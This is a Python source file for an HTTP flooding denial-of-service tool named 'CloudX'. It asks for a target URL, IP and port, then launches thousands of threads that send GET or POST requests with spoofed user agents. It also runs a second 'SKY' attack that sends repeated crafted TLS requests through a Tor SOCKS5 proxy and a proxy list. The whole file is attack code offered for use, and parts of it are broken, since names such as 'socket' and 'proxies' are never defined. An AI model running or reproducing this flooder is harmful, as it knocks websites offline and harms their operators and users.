import threading
import requests
import random
import os
import time
import socks
from urllib.parse import urlparse
import ssl

os.system('clear')
print("POST Method is currently being fixed and it is error right now, please use GET instead.")
logo = """
< =============== >
      CloudX
^ <=============> ^
"""
print(logo)

# Variables
url = ""
ip = ""
port = ""
threads = ""
method = ""
maxThreads = 35999

url = input("[+] Enter a URL to attack: ")
ip = input("[+] Enter the target IP address: ")
port = input("[+] Enter the target port (default: 80): ")
numberOfThreads = input("[+] Enter the desired number of threads (default: 16500): ")
method = input("[+] Enter either 'GET' or 'POST' as the request method (default: GET): ")
print("[!] additional prompt, please fill this. ( Theres 2 different attack )")
SKY_url = input("[+] Enter a URL for SKY attack: ")
SKY_timer = input("[+] Enter the duration for SKY attack (in seconds): ")
SKY_threads = input("[+] Enter the number of threads for SKY attack: ")
print("[Check Traffic!]")
time.sleep(0.5)

if port == "":
    port = 80
else:
    port = int(port)

if numberOfThreads == "":
    numberOfThreads = 17500
else:
    numberOfThreads = int(numberOfThreads)

if numberOfThreads > maxThreads:
    numberOfThreads = maxThreads

if method == "":
    method = "GET"

# Construct attack parameters ( User Agen nya broo )
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Connection': 'close'
}

USER_AGENT_PARTS = {
    'os': {
        'linux': {
            'name': ['Linux x86_64', 'Linux i386'],
            'ext': ['X11']
        },
        'windows': {
            'name': ['Windows NT 6.1', 'Windows NT 6.3', 'Windows NT 5.1', 'Windows NT.6.2'],
            'ext': ['WOW64', 'Win64; x64']
        },
        'mac': {
            'name': ['Macintosh'],
            'ext': ['Intel Mac OS X %d_%d_%d' % (random.randint(10, 11), random.randint(0, 9), random.randint(0, 5)) for i in range(1, 10)]
        },
    },
    'platform': {
        'webkit': {
            'name': ['AppleWebKit/%d.%d' % (random.randint(535, 537), random.randint(1,36)) for i in range(1, 30)],
            'details': ['KHTML, like Gecko'],
            'extensions': ['Chrome/%d.0.%d.%d Safari/%d.%d' % (random.randint(6, 32), random.randint(100, 2000), random.randint(0, 100), random.randint(535, 537), random.randint(1, 36)) for i in range(1, 30) ] + [ 'Version/%d.%d.%d Safari/%d.%d' % (random.randint(4, 6), random.randint(0, 1), random.randint(0, 9), random.randint(535, 537), random.randint(1, 36)) for i in range(1, 10)]
        },
        'iexplorer': {
            'browser_info': {
                'name': ['MSIE 6.0', 'MSIE 6.1', 'MSIE 7.0', 'MSIE 7.0b', 'MSIE 8.0', 'MSIE 9.0', 'MSIE 10.0'],
                'ext_pre': ['compatible', 'Windows; U'],
                'ext_post': ['Trident/%d.0' % i for i in range(4, 6) ] + [ '.NET CLR %d.%d.%d' % (random.randint(1, 3), random.randint(0, 5), random.randint(1000, 30000)) for i in range(1, 10)]
            }
        },
        'gecko': {
            'name': ['Gecko/%d%02d%02d Firefox/%d.0' % (random.randint(2001, 2010), random.randint(1,31), random.randint(1,12) , random.randint(10, 25)) for i in range(1, 30)],
            'details': [],
            'extensions': []
        }
    }
}

# SOCKS5 Proxy Configuration
socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
socket.socket = socks.socksocket

def LaunchSKY(url, timer):
    proxy = random.choice(proxies).strip().split(":")
    timelol = time.time() + int(timer)
    req =  "GET / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
    req += "Cache-Control: no-cache\r\n"
    req += "User-Agent: " + random.choice(USER_AGENT_PARTS['platform']['webkit']['name']) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    req += "Sec-Fetch-Site: same-origin\r\n"
    req += "Sec-GPC: 1\r\n"
    req += "Sec-Fetch-Mode: navigate\r\n"
    req += "Sec-Fetch-Dest: document\r\n"
    req += "Upgrade-Insecure-Requests: 1\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    while time.time() < timelol:
        try:
            s = socks.socksocket()
            s.connect((str(urlparse(url).netloc), int(443)))
            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            ctx = ssl.SSLContext()
            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
            s.send(str.encode(req))
            try:
                for _ in range(100):
                    s.send(str.encode(req))
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            s.close()

def attackSKY(url, timer, threads):
    for i in range(int(threads)):
        threading.Thread(target=LaunchSKY, args=(url, timer)).start()

def attack(threadNum):
    session = requests.Session()
    session.headers.update(headers)
    while True:
        try:
            if method == "GET":
                for _ in range(6500):
                    response = session.get(url)
                    print("[*] Thread (%s) | Attack Sent! Status Code: %s" % (threadNum, response.status_code))
            else:
                for _ in range(6500):
                    response = session.post(url)
                    print("[*] Thread (%s) | Attack Sent! Status Code: %s" % (threadNum, response.status_code))
        except requests.RequestException as e:
            print("[*] Thread (%s) | Request failed! Error: %s" % (threadNum, str(e)))

def flood_url():
    while True:
        user_agent = ' '.join([random.choice(USER_AGENT_PARTS['platform'][k]) for k in USER_AGENT_PARTS['platform']])
        user_agent += ' (' + random.choice(USER_AGENT_PARTS['platform']['webkit']['name']) + ')'
        headers['User-Agent'] = user_agent
        time.sleep(0.1)  # Added delay to reduce the rate of requests and avoid being blocked
        requests.get(url, headers=headers)

# Mulai ( start flooding )
for i in range(numberOfThreads):
    threading.Thread(target=attack, args=(i,)).start()
threading.Thread(target=flood_url).start()

# Start SKY attack
if SKY_url and SKY_timer and SKY_threads:
    threading.Thread(target=attackSKY, args=(SKY_url, SKY_timer, SKY_threads)).start()

# NOTE
"""
CloudX is under development, so don't have high expectations about this. alright?
"""
